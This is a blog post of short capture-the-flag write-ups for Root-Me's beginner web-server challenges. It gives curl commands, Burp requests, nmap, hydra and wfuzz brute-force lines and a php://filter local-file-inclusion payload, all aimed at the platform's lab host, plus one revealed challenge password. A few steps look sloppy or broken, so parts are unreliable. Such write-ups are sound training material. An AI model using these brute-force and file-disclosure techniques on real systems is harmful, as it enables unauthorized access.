---
layout: post
author: Razor
title: "Root-me Webserver"
categories: [root-me]
tags: [web-server]     # TAG names should always be lowercase
image: assets/root-me/bg.jpeg
toc: true
---


### HTML - Source code 
```#
Look at source code
<!-- 
 Je crois que c'est vraiment trop simple là ! 
password : xxx
-->
```
### HTTP - Open redirect
```#
by using `hash-identifier` tool, I found that the hash algorithm is MD5:
Type "help", "copyright", "credits" or "license" for more information.
>>>
>>> import md5
>>> md5.new('https://facebook.com').digest().encode('hex')
'a023cfbf5f1c39bdf8407f28b60cd134'
>>>
>>> md5.new('https://mydomain.com').digest().encode('hex')
'9af3e23ea90265a580cb11bfce830f97'
Then submit the GET request with my evil domain and related MD5 hash 

OR 

import hashlib
kata = input("enter text : ")
tytd1 = hashlib.md5(kata.encode())
tytd2 = tytd1.hexdigest()
print(tytd2)
```
### HTTP - User-Agent
```#
curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: rr$Li9%L34qd1AAe27</h3></body></html>
```
### Weak Password 
```#
nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
or 
nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
or
hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/
or
wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --basic admin:FUZZ http://challenge01.root-me.org/web-serveur/ch3/
```
### Backup File 
```#
nmap -p 80 --script=http-backup-finder --script-args http-backup-finder.url=/web-serveur/ch11/index.php challenge01.root-me.org
PORT   STATE SERVICE
80/tcp open  http
| http-backup-finder:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=challenge01.root-me.org
|_  http://challenge01.root-me.org:80/web-serveur/ch11/index.php~
or
Used OWASP ZAP’s Active Scanner with Backup File Search (included in Active Scanner Rules (beta)). Make sure to use the full path (http://challenge01.root-me.org/web-serveur/ch11/index.php) for the scan and it’ll find the backup "http://challenge01.root-me.org/web-serveur/ch11/index.php~" file, which has a hardcoded password

```
### HTTP - Directory indexing
```#
firs we must check source code and you can see /admin/pass.html
then open /admin
and /admin/backup

```
### HTTP - Headers 
```#
Using CURL:

Request the headers only:
curl -I http://challenge01.root-me.org/web-serveur/ch5/

Send request with headers:
curl -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
```
### PHP - Filters
```#
We’re going to work at the command line, so let’s define a variable we will use:
url=http://challenge01.root-me.org//web-serveur/ch12/

We know we are looking for a LFI with php://filter, so let’s try to display the base64 of the file login.php which is use for the authentication(?inc=login.php)

$ curl "${url}?inc=php://filter/read=convert.base64-encode/resource=login.php"

```
### HTTP POST 
```#
first using burp suit and change to this 

POST /web-serveur/ch56/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: http://challenge01.root-me.org
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch56/
Upgrade-Insecure-Requests: 1

score=999999999999999999999999999999&generate=Give+a+try%21
```
### HTTP - Improper redirect
```#
curl -H "HTTP/1.1 200" "http://challenge01.root-me.org/web-serveur/ch32/index.php?redirect"
```
### HTTP - Verb tampering
```#
Using Burp :
OPTIONS /web-serveur/ch8/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11;Linux x86_64; rv:78.0) Gecko/20100101 
Curl :
curl http://challenge01.root-me.org/web-serveur/ch8/ -X OPTIONS
```